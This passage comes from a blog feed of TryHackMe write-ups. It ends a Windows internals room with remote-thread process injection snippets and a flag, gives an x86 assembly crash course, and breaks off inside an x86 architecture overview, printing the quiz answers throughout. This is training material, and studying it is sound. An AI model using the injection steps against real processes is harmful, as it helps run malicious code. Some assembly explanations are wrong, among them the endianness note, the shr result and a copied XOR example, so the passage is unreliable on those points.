</code></pre></div></div> <p>At step three, we can use <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> to write the payload to the allocated region of memory.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">WriteProcessMemory</span><span class="p">(</span>
	<span class="n">hProcess</span><span class="p">,</span> <span class="c1">// Opened target process</span>
	<span class="n">remoteBuffer</span><span class="p">,</span> <span class="c1">// Allocated memory region</span>
	<span class="n">payload</span><span class="p">,</span> <span class="c1">// Data to write</span>
	<span class="k">sizeof</span> <span class="n">payload</span><span class="p">,</span> <span class="c1">// byte size of data</span>
	<span class="nb">NULL</span>
<span class="p">);</span>
</code></pre></div></div> <p>At step four, we can use <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> to execute our payload from memory.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">remoteThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span>
	<span class="n">hProcess</span><span class="p">,</span> <span class="c1">// Opened target process</span>
	<span class="nb">NULL</span><span class="p">,</span> 
	<span class="mi">0</span><span class="p">,</span> <span class="c1">// Default size of the stack</span>
	<span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">remoteBuffer</span><span class="p">,</span> <span class="c1">// Pointer to the starting address of the thread</span>
	<span class="nb">NULL</span><span class="p">,</span> 
	<span class="mi">0</span><span class="p">,</span> <span class="c1">// Ran immediately after creation</span>
	<span class="nb">NULL</span>
<span class="p">);</span> 
</code></pre></div></div> <h3 id="question">Question</h3> <p><strong>Enter the flag obtained from the executable <em>inject-poc.exe</em>.</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">THM{1Nj3c7_4lL_7H3_7h1NG2}</code></em></p> <h2 id="task-8---conclusion">Task 8 - Conclusion</h2> <p>Throughout this exploration of Windows internals, we’ve delved into the foundational components that underpin the Windows operating system. From processes and threads to virtual memory management, dynamic link libraries (DLLs), and the Portable Executable (PE) format, each element contributes to the intricate workings of Windows. These internals, deeply ingrained and integral to system functionality, present both opportunities and risks. Attackers leverage these internals for malicious purposes, exploiting vulnerabilities that can compromise system integrity.<br/> The universality of these concepts extends beyond Windows to Unix environments, highlighting the enduring relevance of system internals in cybersecurity. Whether defending against or exploiting these fundamentals, understanding Windows internals is essential for both offensive and defensive security efforts, ensuring a comprehensive grasp of capabilities and vulnerabilities within complex operating system architectures.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="Operating System"/><category term="Windows"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM x86 Assembly Crash Course</title><link href="https://nonohm.github.io/blog/2024/THM-x86-Assembly-Crash-Course/" rel="alternate" type="text/html" title="THM x86 Assembly Crash Course"/><published>2024-04-14T16:52:32+00:00</published><updated>2024-04-14T16:52:32+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-x86%20Assembly-Crash-Course</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-x86-Assembly-Crash-Course/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>The assembly language is the lowest level of human-readable language and is also the highest level of language into which a binary can be reliably decompiled. That is why knowing the basics of the assembly language is essential when doing reverse engineering because malware samples are most likely to be compiled binaries. The two options are decompiling or disassembling but the problem with disasembling is that a lot of information in the source code is removed, thus natural names for variables or functions are changed in the compiling process. That is why the most reliable code we have is assembly code.</p> <h3 id="learning-objectives">Learning Objectives</h3> <p>We will be covering the following topics:</p> <ul> <li>Opcodes and operands</li> <li>General assembly instructions</li> <li>Arithmetic and logical instructions</li> <li>Conditionals</li> <li>Branching instructions</li> </ul> <h2 id="task-2---opcodes-and-operands">Task 2 - Opcodes and Operands</h2> <p>The code of a program to be executed by the CPU needs to be written ion its binary form, so it is a sequence of 1s and 0s. To be understandable for humans, the instructions are gathered into groups of 8 bits to form a byte and one byte form 2 hex digits. Among these, there are opcodes and operands; opcodes represent the actual operations and operands represent the registers, memory locations or immediate values on which the operations are performed.</p> <h3 id="opcodes">Opcodes</h3> <p>Like said before, Opcodes are numbers that correspond to instructions performed by the CPU. A disassembler reads opcodes and translates them into human readable text.</p> <p>An example of instruction that moves the number <code class="language-plaintext highlighter-rouge">0x5f</code> (95 in decimal form) into <em>eax</em> register:</p> <pre><code class="language-asm">040000:    b8 5f 00 00 00    mov eax, 0x5f
</code></pre> <ul> <li><code class="language-plaintext highlighter-rouge">040000</code>: Address where the instruction is located</li> <li><code class="language-plaintext highlighter-rouge">b8</code>: Opcode <code class="language-plaintext highlighter-rouge">mov eax</code></li> <li><code class="language-plaintext highlighter-rouge">5f 00 00 00</code>: Operand <code class="language-plaintext highlighter-rouge">0x5f</code></li> </ul> <blockquote> <p>Note In little-endian, the instruction would be written <code class="language-plaintext highlighter-rouge">b8 00 00 00 5f</code>.</p> </blockquote> <h3 id="types-of-operands">Types of Operands</h3> <p>In general, there are three types of operands in ASM:</p> <ul> <li><strong>Immediate Operands</strong>: Fixed values like <code class="language-plaintext highlighter-rouge">0x5f</code>.</li> <li><strong>Registers</strong>: Registers are operands like <code class="language-plaintext highlighter-rouge">eax</code></li> <li><strong>Memory Operands</strong>: They are denoted by square brackets and reference memory locations. <code class="language-plaintext highlighter-rouge">[eax]</code> signifies the value present in <code class="language-plaintext highlighter-rouge">eax</code>.</li> </ul> <h3 id="questions">Questions</h3> <p><strong>What are the hex codes that denote the assembly operations called?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Opcodes</code></em></p> <p><strong>Which type of operand is denoted by square brackets?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Memory Operands</code></em></p> <h2 id="task-3---general-instructions">Task 3 - General Instructions</h2> <p>Instructions tell the CPU what operation to perform and operands are used to store results into register or memory.</p> <p><strong><code class="language-plaintext highlighter-rouge">mov</code> instruction</strong></p> <p>The mov instruction moves a value from one location to another. The syntax is:</p> <pre><code class="language-asm">mov destination, source
</code></pre> <p>The mov instruction can move a fixed value to a register, a register to another register, or a value in a memory location to a register.</p> <ul> <li><strong>Fixed value to register</strong>: <code class="language-plaintext highlighter-rouge">mov eax, 0x5f</code></li> <li><strong>Value stored in register to register</strong>: <code class="language-plaintext highlighter-rouge">mov eax, ebx</code></li> <li><strong>Value stored in memory location to register</strong>: <code class="language-plaintext highlighter-rouge">mov eax, [0x5fccbe]</code> or <code class="language-plaintext highlighter-rouge">mov eax, [ebx]</code> or <code class="language-plaintext highlighter-rouge">mov eax, [ebx+4]</code></li> </ul> <p><em>Value stored in memory location to register explained</em></p> <p>The first example takes the value stored in <code class="language-plaintext highlighter-rouge">0x5fccbe</code> to <code class="language-plaintext highlighter-rouge">eax</code>. The second example takes the value stored into the memory address, contanied into <code class="language-plaintext highlighter-rouge">ebx</code> to eax. Example:</p> <pre><code class="language-asm">mov ebx, 0x5fccbe
mov eax, [ebx]
; = mov eax, [0x5fccbe]
</code></pre> <p>The third example does the same thing with an offset of 4 in the memory location like <code class="language-plaintext highlighter-rouge">[0x5fccbe+4]</code>.</p> <p><strong><code class="language-plaintext highlighter-rouge">lea</code> instruction</strong></p> <p>The lea instruction stands for <em>load effective address</em>. While the mov instruction moves the data from the source to the detsination, the lea instruction moves the memory address of the source to the destination. The syntax is:</p> <pre><code class="language-asm">lea destination, source
</code></pre> <p>Here, <code class="language-plaintext highlighter-rouge">lea eax, [ebp+4]</code> moves the memory address located into <code class="language-plaintext highlighter-rouge">ebp</code> and adds 4.</p> <p><strong><code class="language-plaintext highlighter-rouge">nop</code> instruction</strong></p> <p>nop stands for no operation because it moves eax value into itself, resulting in no meaningful opreation. The nop instructions are used for consuming CPU cycles while waiting for an operation or other such purposes. The syntax is:</p> <pre><code class="language-asm">nop
</code></pre> <p><strong>Shift instructions</strong></p> <p>Shift instructions serve to shift each bit to left or right by adding a certain number of 0s at the start or at the end. The syntax is:</p> <pre><code class="language-asm">shr destination, count
shl destination, count
</code></pre> <p>This means overflowing is possible like:</p> <pre><code class="language-asm">mov eax, 0x00000101
shr eax, 1
; eax =&gt; 0x00000010 and CR Flag is set to 1
</code></pre> <p><strong>Rotate instructions</strong></p> <p>Rotate instructions are similar to the shift ones; the bits are shifted to the left or right but the end bit of the value returns back to the start if the shift goes to the right and the first bit returns back to the end if the shift goes to the left. The syntax is:</p> <pre><code class="language-asm">ror destination, count
rol destination, count
</code></pre> <p>Examples:</p> <pre><code class="language-asm">; Right shift
mov eax, 0b00000101 ; or 0x05
ror eax, 1
; eax =&gt; 0b10000010 or 0x82

; Left shift
mov ebx, 10100000 , or 0xa0
rol ebx, 1
; ebx =&gt; 01000001 or 0x41
</code></pre> <h3 id="questions-1">Questions</h3> <p><strong>In mov eax, ebx, which register is the destination operand?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">eax</code></em></p> <p><strong>What instruction performs no action?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">nop</code></em></p> <h2 id="task-4---flags">Task 4 - Flags</h2> <p>In x86 assembly language, CPU has several flags that indicate the outcome of certain operations or conditions which are stored in EFLAGS/RFLAGS register.</p> <table> <thead> <tr> <th style="text-align: center">Flag</th> <th style="text-align: center">Abbreviation</th> <th style="text-align: center">Explanation</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">Carry</td> <td style="text-align: center">CF</td> <td style="text-align: center">Set when a carry-out or borrow is required from the most significant bit in an arithmetic operation. Also used for bit-wise shifting operations.</td> </tr> <tr> <td style="text-align: center">Parity</td> <td style="text-align: center">PF</td> <td style="text-align: center">Set if the least significant byte of the result contains an even number of 1 bits.</td> </tr> <tr> <td style="text-align: center">Auxiliary</td> <td style="text-align: center">AF</td> <td style="text-align: center">Set if a carry-out or borrow is required from bit 3 to bit 4 in an arithmetic operation (BCD arithmetic).</td> </tr> <tr> <td style="text-align: center">Zero</td> <td style="text-align: center">ZF</td> <td style="text-align: center">Set if the result of the operation is zero.</td> </tr> <tr> <td style="text-align: center">Sign</td> <td style="text-align: center">SF</td> <td style="text-align: center">Set if the result of the operation is negative (i.e., the most significant bit is 1).</td> </tr> <tr> <td style="text-align: center">Overflow</td> <td style="text-align: center">OF</td> <td style="text-align: center">Set if there’s a signed arithmetic overflow (e.g., adding two positive numbers and getting a negative result or vice versa).</td> </tr> <tr> <td style="text-align: center">Direction</td> <td style="text-align: center">DF</td> <td style="text-align: center">Determines the direction for string processing instructions. If DF=0, the string is processed forward; if DF=1, the string is processed backward.</td> </tr> <tr> <td style="text-align: center">Interrupt Enable</td> <td style="text-align: center">IF</td> <td style="text-align: center">If set (1), it enables maskable hardware interrupts. If cleared (0), interrupts are disabled.</td> </tr> </tbody> </table> <p>Flags can be used in conditional jumps and are crucial for implementing conditional branching in assembly code.</p> <h3 id="questions-2">Questions</h3> <p><strong>Which flag will be set if the result of the operation is zero? (Answer in abbreviation)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">ZF</code></em></p> <p><strong>Which flag will be set if the result of the operation is negative? (Answer in abbreviation)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">SF</code></em></p> <h2 id="task-5---arithmetic-and-logical-instructions">Task 5 - Arithmetic and Logical Instructions</h2> <h3 id="arithmetic-instructions">Arithmetic Instructions</h3> <p><strong>Addition and Subtraction Instructions</strong></p> <p>In the addition instruction, the value is added to the destination and then stored into it. The syntax is:</p> <pre><code class="language-asm">add destination, value
; x = x + value
</code></pre> <p>In the substraction instruction, the destination is substracted by the value and then stored into the destination. The syntax is:</p> <pre><code class="language-asm">sub destination, value
; x = x - value
</code></pre> <p>The value can be a constant or a register. For substraction, ZF is set if the result is zero and CF is set if the destination is smaller than the value.</p> <p><strong>Multiplication and Division Instructions</strong></p> <p>The multiplication and division operations use the eax and edx registers.</p> <p>The multiply instruction has the following syntax:</p> <pre><code class="language-asm">mul value
</code></pre> <p>It multiplies the value with the one stored into <code class="language-plaintext highlighter-rouge">eax </code>and stores the result into <code class="language-plaintext highlighter-rouge">edx:eax</code>, beceause the multiplication of two 32-bit values can often result in higher ones. The lower bits are in <code class="language-plaintext highlighter-rouge">eax</code> and the higher bits are in <code class="language-plaintext highlighter-rouge">edx</code>.</p> <p>Tha value can be another register or a constant.</p> <p>The division instruction has the following syntax:</p> <pre><code class="language-asm">div value
</code></pre> <p>It divides the 64-bit value in <code class="language-plaintext highlighter-rouge">edx:eax</code> and saves the result in <code class="language-plaintext highlighter-rouge">eax</code> and the reminder in <code class="language-plaintext highlighter-rouge">edx</code>.</p> <p><strong>Increment and Decrement Instructions</strong></p> <p>These instructions increment or decrement the operand by 1. The syntax is:</p> <pre><code class="language-asm">inc eax ; Increase by 1
dec eax ; Decrease by 1
</code></pre> <h3 id="logical-instructions">Logical Instructions</h3> <p><strong>AND instruction</strong></p> <p>The AND intruction performs a bitwise (bit per bit) AND operation on the operands.</p> <table> <thead> <tr> <th>A</th> <th>B</th> <th>A AND B</th> </tr> </thead> <tbody> <tr> <td>0</td> <td>0</td> <td>0</td> </tr> <tr> <td>0</td> <td>1</td> <td>0</td> </tr> <tr> <td>1</td> <td>0</td> <td>0</td> </tr> <tr> <td>1</td> <td>1</td> <td>1</td> </tr> </tbody> </table> <p>The syntax is:</p> <pre><code class="language-asm">and destination, source
; mv ax, 0x0000
; and ax, 0xFFFF
; =&gt; ax = 0x0000
</code></pre> <p><strong>OR instruction</strong></p> <p>The OR intruction performs a bitwise (bit per bit) OR operation on the operands.</p> <table> <thead> <tr> <th>A</th> <th>B</th> <th>A OR B</th> </tr> </thead> <tbody> <tr> <td>0</td> <td>0</td> <td>0</td> </tr> <tr> <td>0</td> <td>1</td> <td>1</td> </tr> <tr> <td>1</td> <td>0</td> <td>1</td> </tr> <tr> <td>1</td> <td>1</td> <td>1</td> </tr> </tbody> </table> <p>The syntax is:</p> <pre><code class="language-asm">or destination, source
; mv ax, 0x0000
; or ax, 0xFFFF
; =&gt; ax = 0xFFFF
</code></pre> <p><strong>NOT Instruction</strong></p> <p>The NOT instruction takes one operand and simply inverts the operand bits.</p> <table> <thead> <tr> <th>A</th> <th>NOT A</th> </tr> </thead> <tbody> <tr> <td>0</td> <td>1</td> </tr> <tr> <td>1</td> <td>0</td> </tr> </tbody> </table> <p>The syntax is:</p> <pre><code class="language-asm">not operand
</code></pre> <p><strong>XOR Instruction</strong></p> <p>The XOR intruction performs a bitwise (bit per bit) XOR operation on the operands.</p> <table> <thead> <tr> <th>A</th> <th>B</th> <th>A XOR B</th> </tr> </thead> <tbody> <tr> <td>0</td> <td>0</td> <td>0</td> </tr> <tr> <td>0</td> <td>1</td> <td>1</td> </tr> <tr> <td>1</td> <td>0</td> <td>1</td> </tr> <tr> <td>1</td> <td>1</td> <td>0</td> </tr> </tbody> </table> <p>The syntax is:</p> <pre><code class="language-asm">xor destination, source
; mv ax, 0x0000
; or ax, 0xFFFF
; =&gt; ax = 0xFFFF
</code></pre> <h3 id="questions-3">Questions</h3> <p><strong>In a subtraction operation, which flag is set if the destination is smaller than the subtracted value?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Carry Flag</code></em></p> <p><strong>Which instruction is used to increase the value of a register</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">inc</code></em></p> <p><strong>Do the following instructions have the same result? (yea/nay)</strong></p> <pre><code class="language-asm">xor eax, eax
mov eax, 0
</code></pre> <p><em>Answer: <code class="language-plaintext highlighter-rouge">yea</code></em></p> <h2 id="task-6---conditionals-and-branching">Task 6 - Conditionals and branching</h2> <h3 id="conditionals">Conditionals</h3> <p>Conditional instructions determine if two values are equal to, greater than or less than each other.</p> <p><strong>TEST Instruction</strong></p> <p>The test instruction performs a bitwise AND operation and instead of storing the result in the destination, it sets the Zero Flag if the result is O. This is often used to check if an operand is a null value. The syntax is:</p> <p><code class="language-plaintext highlighter-rouge">test destination, source</code></p> <p><strong>CMP Instruction</strong></p> <p>The CMP instruction compares two operands and sets the ZF or CF depending of the result. It works by performing a substration, then set the ZF if both operands are equal or CF if the source &gt; destination. CF and ZF are clear if destination &gt; source. The syntax is:</p> <pre><code class="language-asm">cmp destination, source
</code></pre> <h3 id="branching">Branching</h3> <p>Branching changes the value of the Instruction Pointer in order to change program’s flow.</p> <p><strong>JMP Instruction</strong></p> <p>The JMP instruction makes the IP jump to a specified location. The syntax is:</p> <pre><code class="language-asm">jmp location ;Memory Address
</code></pre> <p><strong>Conditional Jumps</strong></p> <p>Conditional jumps decide to jump based on the Flag Registers values.</p> <table> <thead> <tr> <th>Instruction</th> <th>Explanation</th> </tr> </thead> <tbody> <tr> <td>jz</td> <td>Jump if the ZF is set (ZF=1).</td> </tr> <tr> <td>jnz</td> <td>Jump if the ZF is not set (ZF=0).</td> </tr> <tr> <td>je</td> <td>Jump if equal. Often used after a CMP instruction.</td> </tr> <tr> <td>jne</td> <td>Jump if not equal. Often used after a CMP instruction.</td> </tr> <tr> <td>jg</td> <td>Jump if the destination is greater than the source operand. Performs signed comparison and is often used after a CMP instruction.</td> </tr> <tr> <td>jl</td> <td>Jump if the destination is lesser than the source operand. Performs signed comparison and is often used after a CMP instruction.</td> </tr> <tr> <td>jge</td> <td>Jump if greater than or equal to. Jumps if the destination operand is greater than or equal to the source operand. Similar to the above instructions.</td> </tr> <tr> <td>jle</td> <td>Jump if lesser than or equal to. Jumps if the destination operand is lesser than or equal to the source operand. Similar to the above instructions.</td> </tr> <tr> <td>ja</td> <td>Jump if above. Similar to jg, but performs an unsigned comparison.</td> </tr> <tr> <td>jb</td> <td>Jump if below. Similar to jl, but performs an unsigned comparison.</td> </tr> <tr> <td>jae</td> <td>Jump if above or equal to. Similar to the above instructions.</td> </tr> <tr> <td>jbe</td> <td>Jump if below or equal to. Similar to the above instructions.</td> </tr> </tbody> </table> <h3 id="questions-4">Questions</h3> <p><strong>Which flag is set as a result of the test instruction being zero?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Zero Flag</code></em></p> <p><strong>Which of the below operations uses subtraction to test two values? 1 or 2?</strong></p> <ol> <li>cmp eax, ebx</li> <li>test eax, ebx</li> </ol> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>Which flag is used to identify whether a jump will be taken or not after a jz or jnz instruction?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Zero Flag</code></em></p> <h2 id="task-7---stack-and-function-calls">Task 7 - Stack and Function calls</h2> <h3 id="the-stack">The Stack</h3> <p>We have already learnt that the stack is a LIFO (Last In, First Out) Memory. This means the last variable pushed onto the stack is the first to pop.</p> <p><strong>PUSH Instruction</strong></p> <p>The push instruction push the source operand onto the stack, becoming the top of the stack. The value of the memory location is pointed by the Stack Pointer (ESP). The syntax is:</p> <pre><code class="language-asm">push source
</code></pre> <ul> <li><code class="language-plaintext highlighter-rouge">pusha</code>: Pushes all 16-bit GP registers to the stack from AX to DI.</li> <li><code class="language-plaintext highlighter-rouge">pushad</code>: Pushes all 32-bit GP registers to the stack from EAX to EDI.</li> </ul> <p><strong>POP Instruction</strong></p> <p>The pop instruction retrieves the value from the top of the stack and stores it in the destination operand. As a result, the ESP is also decremented, updated to point to the new top of the stack. The syntax is:</p> <pre><code class="language-asm">pop destination
</code></pre> <ul> <li><code class="language-plaintext highlighter-rouge">popa</code>: Pops all 16-bit GP registers from the stack from DI to AX.</li> <li><code class="language-plaintext highlighter-rouge">popad</code>: Pops all 32-bit GP registers from the stack from EDI to EAX.</li> </ul> <p><strong>CALL Instruction</strong></p> <p>The <code class="language-plaintext highlighter-rouge">call</code> instruction is used to perform a function call. It saves the return address which is the one just after the <code class="language-plaintext highlighter-rouge">call</code> instruction by pushing it onto the stack, then it jumps to the specified address and begins executing from here. The syntax is:</p> <p><code class="language-plaintext highlighter-rouge">call location</code></p> <h3 id="questions-5">Questions</h3> <p><strong>Which instruction is used for performing a function call?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">call</code></em></p> <p><strong>Which instruction is used to push all registers to the stack?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">pusha</code></em></p> <h2 id="task-8---practice-time">Task 8 - Practice Time</h2> <p>Run instructions and observe the stack, memory and register on the Assembly Emulator.</p> <h3 id="questions-6">Questions</h3> <p><strong>While running the MOV instructions, what is the value of [eax] after running the 4th instruction? (in hex)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x00000040</code></em></p> <p><strong>What error is displayed after running the 6th instruction from the MOV instruction section?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Memory to memory data movement is not allowed.</code></em></p> <p><strong>Run the instructions from the stack section. What is the value of eax after the 9th instruction? (in hex)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x00000025</code></em></p> <p><strong>Run the instructions from the stack section. What is the value of edx after the 12th instruction? (in hex)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x00000010</code></em></p> <p>Run the instructions from the stack section. After POP ecx, what is the value left at the top of the stack? (in hex)</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x00000010</code></em></p> <p>Run the cmp and test instructions. Which flags are triggered after the 3rd instruction? (Note: Use these abbreviations in alphabetical order with no spaces: CF,PF,SF,ZF)</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">PF,ZF</code></em></p> <p>Run the test and the cmp instructions. Which flags are triggered after the 11th instruction? (Note: Use these abbreviations in alphabetical order with no spaces: CF,PF,SF,ZF)</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">CF,SF</code></em></p> <p>Run the instructions from the lea section. What is the value of eax after running the 9th instruction? (in hex)</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x0000004B</code></em></p> <p>Run the instructions from the lea section. What is the final value found in the ECX register? (in hex)</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x00000045</code></em></p> <h2 id="task-9---conclusion">Task 9 - Conclusion</h2> <p>In this module, we’ve explored foundational concepts of x86 assembly language, focusing on essential instructions and operations. We learned how to convert opcodes into assembly language, and covered general instructions like move (mov), load effective address (lea), shift, and rotate. Additionally, we delved into arithmetic operations including addition, subtraction, multiplication, and division. We also discussed conditionals for branching, understanding how to control program flow based on conditions. Lastly, we explored stack operations (push and pop) and how they are used in function calls.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="x86 Assembly"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM x86 Architecture Overview</title><link href="https://nonohm.github.io/blog/2024/THM-x86-Architecture-Overview/" rel="alternate" type="text/html" title="THM x86 Architecture Overview"/><published>2024-04-06T15:28:32+00:00</published><updated>2024-04-06T15:28:32+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-x86-Architecture-Overview</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-x86-Architecture-Overview/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>Because malware works by abusing the way systems are designed, it is essential to know the architecture of the systems they are running in, in order to know how they work.</p> <h3 id="learning-objectives">Learning Objectives</h3> <p>Here are the topics covered in this room:</p> <ol> <li>Overview of CPU architecture and its components</li> <li>Different types of CPU registers and their usage</li> <li>Memory layout as viewed by a program</li> <li>Stack layout and stack registers</li> </ol> <h2 id="task-2---cpu-architecture-overview">Task 2 - CPU Architecture Overview</h2> <p>The CPU Architecture that is most widely used is derived from the Von Neumann Architecture.</p> <figure> <picture> <img src="/assets/img/images/thm_x86_architecture_overview/B1dx6o0y0.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="Von Neumann Architecture" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Von Neumann architecture is composed of three main components:</p> <ul> <li><strong>CPU (Central Processing Unit):</strong>: Executes instructions and controls operations of the computer.</li> <li><strong>Main Memory (RAM)</strong>: Stores data and instructions the CPU needs to operate on. It is where the code and data for a program to run, is located.</li> <li><strong>Input/Output Devices</strong>: Allows interaction with the computer like keyboards, monitors and storage devices.</li> </ul> <p>The CPU here has three components:</p> <ul> <li><strong>ALU (Arithmetic Logic Unit)</strong>: Executes the instructions fetched from memory. Results are then stored in either Registers or Memory.</li> <li><strong>Control Unit</strong>: Gets instructions from the Main Memory, interprets them to understand what operation needs to be performed, and directs them to the ALU. It also generates control signals to coordinate activities of other parts of the CPU and ensures that instructions are executed in the correct sequence and at the right timing.</li> <li><strong>Registers</strong>: Registers are CPU’s strorage. While being signifanctly smaller than Main memory, Registers help save time in executing instructions by placing important data in direct access to the CPU. In Registers, there is also a specific register where is located the Instruction Pointer (IP). It holds the memory address of the next instruction to be fetched and executed during the operation of a program. IP is called EIP (Extended Instruction Pointers) in 32-bit and RIP (Register Instruction Pointer) in 64-bit.</li> </ul> <p>In short, when a program has to be executed, it is loaded into the memory. From there, the Control Unit fetches one instruction at a time using the Instruction Pointer Register, and the Arithmetic Logic Unit executes it. The results are stored in either the Registers or the Memory.</p> <h3 id="questions">Questions</h3> <p><strong>In which part of the Von Neumann architecture are the code and data required for a program to run stored?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Memory</code></em></p> <p><strong>What part of the CPU stores small amounts of data?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Registers</code></em></p> <p><strong>In which unit are arithmetic operations performed?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Arithmetic Logic Unit</code></em></p> <h2 id="task-3---registers-overview">Task 3 - Registers Overview</h2> <p>Like said before, registers are the CPU’s storage medium and data can be accessed quickier than from any other memory. However, it’s limited size means it has to be used effectively. For this purpose, registers are divided into the following different types:</p> <ul> <li>Instruction Pointer</li> <li>General Purpose Registers</li> <li>Status Flag Registers</li> <li>Segment Registers</li> </ul> <h3 id="instruction-pointer">Instruction Pointer</h3> <p>The Intstruction Pointer or Program Counter is a registers that contains the address of the next instruction to be exeucted by the CPU. It was originally a 16-bit register and was abbreviated as IP. In 32-bit processors, it became a 32-bit register called EIP for Extended Instruction Pointer. In 64-bit systems, this register became a 64-bit register called RIP (the R here stands for register).</p> <h3 id="general-purpose-registers">General-Purpose Registers</h3> <p>These registers are all 32-bit registers or 64-bit in 64bit systems. They contains:</p> <ul> <li><strong>EAX/RAX</strong>: It is the Accumulator Register. Results of arithmetic operations are often stored in this register. RAX is a 64-bit register and EAX a 32-bit one. The last 16 bits can be accessed by addressing AX. Higher 8 bits can be accessed via AH and lower ones by using AL. These rules also apply to the RBX, RCX and RDX registers, just change the A letter by B, C or D.</li> <li><strong>EBX/RBX</strong>: This register is also called the Base Register, which is often used to store base addresses in memory operations. Memory addresses are commonly accessed using a combination of a base addess and an offset.</li> <li><strong>ECX/RCX</strong>: This register is also called the Counter Register and is often used in counting operations such as loops or string operations…</li> <li><strong>EDX/RDX</strong>: This register is also called the Data Register and is often used in multiplication/division operations.</li> <li><strong>ESP/RSP</strong>: This register is called the Stack Pointer and holds the memory address of the top of the stack and and is used in conjunction with the Stack Segment register. SS Register, on the other hand, contains the base address of the stack. It is a 32-bit register called ESP in 32-bit systems and a 64-bit register called RSP in 64-bit systems. It cannot be addressed as smaller registers, and this rule is valuable for EBP, ESI and RDI.</li> <li><strong>EBP/RBP</strong>: This register is called the Base Pointer and is used to serves as a reference point for accessing data within the stack frame using relative offsets. A stack frame is a block of memory allocated on the stack to manage function execution, containing local variables, function parameters, saved registers, and a return address. It is also used in conjunction with the Stack Segment register.</li> <li><strong>ESI/RSI</strong>: This register is called the Source Index and is used for string operations by holding the source address from where data is read or copied. It is used with the Data Segment register as an offset.</li> <li><strong>EDI/RDI</strong>: This register is called the destination Index resgister and also used for string operation by holding the destination address where data is written or copied. It is used with the Extra Segment register as an offset.</li> <li><strong>R8-R15</strong>: These are 64-bit only GP registers and are not present in 32-bit systems. They are also addressable in 32-bit, 16-bit, and 8-bit modes. For example, for the R8 register, we can use R8D for lower 32-bit addressing, R8W for lower 16-bit addressing, and R8B for lower 8-bit addressing. Here, the suffix D stands for Double-word, W stands for Word, and B stands for Byte.</li> </ul> <p>The picture below is the summary of all GP Registers:</p> <figure> <picture> <img src="/assets/img/images/thm_x86_architecture_overview/HJspqhAyC.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="GP Registers Summary" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="questions-1">Questions</h3> <p><strong>Which register holds the address to the next instruction that is to be executed?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Instruction Pointer</code></em></p> <p>Which register in a 32-bit system is also called the Counter Register?</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">ECX</code></em></p> <p>Which registers from the ones discussed above are not present in a 32-bit system?</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">R8-R15</code></em></p> <h2 id="task-4---registers-continued">Task 4 - Registers Continued</h2> <h3 id="status-flag-registers">Status Flag Registers</h3> <p>When performing execution, some indication about the status of the execution is sometimes neccessary. This is where Status Flags come in. In 32-bit systems, this is a single 32-bit register called EFLAGS and in 64-bits ones, this is exetended to 64 bits and called RFLAGS.</p> <ul> <li><strong>Zero Flag</strong>: Denoted by ZF, it indicates when the result of the last executed instruction was zero. In example, <code class="language-plaintext highlighter-rouge">sub rax, rax -&gt; ZF=1</code>.</li> <li><strong>Cary Flag</strong>: Denoted by CF, it indicates when the las executed instruction resulted in a too big or too small number for the destination. In example, 0xFFFFFFFF + 0x00000001 -&gt; CF=1.</li> <li><strong>Sign Flag</strong>: Denoted by SF, it indicates if the result of an operation is negative or the most significat bit is set to 1.</li> <li><strong>Trap Flag</strong>: Denoted by TF, it indicates whether the processor is in single-step mode, causing the CPU to execute one instruction at 